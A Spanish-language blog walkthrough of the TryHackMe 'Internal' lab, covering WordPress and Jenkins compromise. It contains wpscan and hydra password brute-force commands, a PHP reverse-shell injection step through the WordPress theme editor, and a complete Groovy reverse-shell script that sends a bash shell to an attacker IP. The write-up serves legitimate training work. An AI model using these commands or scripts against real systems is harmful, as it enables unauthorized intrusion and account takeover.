---
title:  CTF TryHackme Internal
tags:
  - Misconfigurations
  - Tryhackme
  - Linux
---

<div class="card mb-3">
    <center>
            <img class="card-img-top" src="/theme/img/THM/Internal/titulo_internal.jpeg"/>
    </center>
</div>

Máquina: Linux

IP: 10.10.246.4

Creada por TheMayor

<!--more-->

## User flag

Se realiza un reconocimiento para ver qué puertos tiene abiertos la máquina usando **nmap**:

```bash
nmap -p- 10.10.246.4
```
<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/nmap.png"/>
    </center>
</div>

Se realiza una búsqueda de directorios ocultos que pueda contener la web con **gobuster**:

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/gobuster.png"/>
    </center>
</div>

Se observa que utiliza Wordpress para la página y phpmyadmin para la base de datos. La página principal se encuentra en /blog. Se analiza la página y no se encuentra nada relevante, ni siquiera ejecutando el wpscan se haya vulnerabilidad con posibilidad de explotarla. Se intenta un ataque de fuerza bruta contra el login con **wpscan**.

```bash
wpscan --url http://10.10.246.4/wordpress -p /usr/share/wordlist/rockyou.txt
```

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/wpscan.png"/>
    </center>
</div>

Con suerte, se obtiene la contraseña de admin y se inicia sesión en wp-admin. Una vez dentro, se inspecciona los plugins, themes, posts que tiene subidos y se encuentra en un post privado, las credenciales de un usuario que de momento no sabemos para que sirve.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/credentials.png"/>
    </center>
</div>

Para obtener una reverse shell mediante Wordpress, se utiliza la pestaña Appearance > Theme Editor para editar un fichero PHP de cualquier tema que esté descargado en el sistema. Por ejemplo, se modifica el fichero header.php y se inyecta una [reverse shell en PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), cambiando la IP y el puerto por el que especifiquemos en el netcat de nuestro equipo. Una vez hecho esto, se pincha en "Update file" y se solicita el recurso de la ruta de dicho archivo:

`internal.thm/blog/wp-content/themes/twentyseventeen/header.php`

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/wwwdata.png"/>
    </center>
</div>

Se obtiene una shell con el usuario **www-data** y en la carpeta /home, se ve que hay un usuario llamado aubreanna.

Para elevar privilegios o realizar un movimiento lateral a otro usuario. Se puede usar **linpeas**, pero no se encontró nada interesante. En la carpeta /opt, se encontró un fichero wp-save.txt que tenía las credenciales del usuario aubreanna.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/wp-save.png"/>
    </center>
</div>

Se utiliza SSH para conectarse con el usuario aubreanna al sistema y la flag se encuentra en el propio home.

## Root flag

En el directorio home se encuentra además de la flag, un fichero jenkins.txt que contiene **"Internal Jenkins service is running on 172.17.0.2:8080"**. Lo que quiere decir que este puerto está capado por el firewall ya que no apareció con el nmap, por lo tanto se crea untúnel SSH para poder ver que se está ejecutando en el puerto 8080.

```bash
ssh -R 1234:localhost:8080 user@10.11.22.147
```

Ahora a través de 127.0.0.1:1234, se puede acceder al servidor Jenkins. En la página se encuentra el logeo para entrar al panel de Jenkins, con las credenciales por defecto no hubo suerte, por lo que se prueba a utilizar fuerza bruta con el usuario admin.

```bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt 127.0.0.1 -s 1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -V
```

En un rato, se conseguira la contraseña del usuario admin.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/hydra.png"/>
    </center>
</div>

Una vez dentro, investigando por Internet, se descubrió una manera de obtener una reverse shell en Jenkins. Desde el Script Console se puede ejecutar el siguiente script Groovy que nos cree una reverse shell.

```groovy
String host="10.11.22.147";
int port=1235;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),
si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.availabl
e()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>
0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Se obtiene una shell bastante incómoda con el usuario **jenkins**. Es importante mencionar que el servidor Jenkins está corriendo en un docker por lo que es un sistema completamente distinto al del "real". Si miramos en /opt, se encontrará un fichero llamado note.txt que contiene las credenciales de root.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/note.png"/>
    </center>
</div>

Desde la sesión de SSH que se tenía con el usuario aubreanna nos pasamos al usuario root y en la ruta /root, se encuentra la flag root.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/Internal/rootflag.png"/>
    </center>
</div>

## Bibliografía

[Abusing Jenkins Groovy Script COnsole to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)